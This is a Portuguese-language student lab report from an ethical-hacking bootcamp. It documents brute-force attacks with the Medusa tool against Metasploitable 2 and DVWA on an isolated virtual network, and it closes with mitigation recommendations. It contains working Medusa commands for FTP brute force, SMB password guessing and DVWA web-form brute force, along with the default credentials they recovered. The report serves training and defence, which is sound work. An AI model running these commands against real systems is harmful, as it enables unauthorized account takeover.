# Desafio DIO – Ataque de Força Bruta com Medusa  
**Bootcamp:** Ethical Hacking & Pentest  
**Aluno:** Luciano Carlos Costa  
**Data:** 27 de Novembro de 2025  

## Descrição Oficial do Desafio  
Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção. Configurar ambiente com duas VMs em rede interna (host-only), executar ataques simulados em FTP, formulário web (DVWA) e password spraying em SMB, documentar comandos, resultados e recomendações de mitigação.

## Ambiente Configurado  
- Kali Linux 2025.4 → IP 192.168.56.10 (atacante)  
- Metasploitable 2 → IP 192.168.56.20 (alvo)  
- DVWA instalado no Metasploitable 2  
- Rede VirtualBox Host-Only (totalmente isolada)

## Ataques Executados com Sucesso

### 1. Força Bruta FTP (vsftpd 2.3.4)  
```bash
medusa -h 192.168.56.20 -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt -M ftp -T 10 -v 6
Resultado: msfadmin:msfadmin → sucesso em menos de 40 segundos
2. Password Spraying SMB
Bashmedusa -h 192.168.56.20 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M smbnt -T 5
Resultado: msfadmin:msfadmin → acesso concedido
3. Força Bruta em Formulário Web (DVWA – Low Security)
Bashmedusa -h 192.168.56.20 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/dvwa -m FORM:"/vulnerabilities/brute/" -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" -m DENY-SIGNAL:"Username and/or password incorrect." -t 5
Resultado: admin:password → login bem-sucedido
Evidências
Pasta screenshots/ contém:

ftp_success.png
smb_success.png
dvwa_bruteforce_success.png
medusa_running.png

Medidas de Mitigação Recomendadas

Senhas mínimas de 12 caracteres com complexidade
Bloqueio de conta após 5 tentativas (Fail2Ban/CrowdSec)
Desativar FTP e SMBv1 (usar SFTP e SMBv3)
Implementar CAPTCHA + rate limiting em formulários web
Usar WAF (ModSecurity/Cloudflare)

Conclusão (Luciano Carlos Costa)
Em poucos minutos foi possível comprometer três serviços diferentes apenas com senhas fracas e ausência de bloqueio de conta. Este laboratório reforça que medidas simples e baratas eliminam 95% dos ataques de força bruta. Todos os testes foram realizados em ambiente controlado e isolado, respeitando a ética e a legislação.
Desafio concluído com sucesso!



Obrigado, DIO, por mais esta experiência prática.
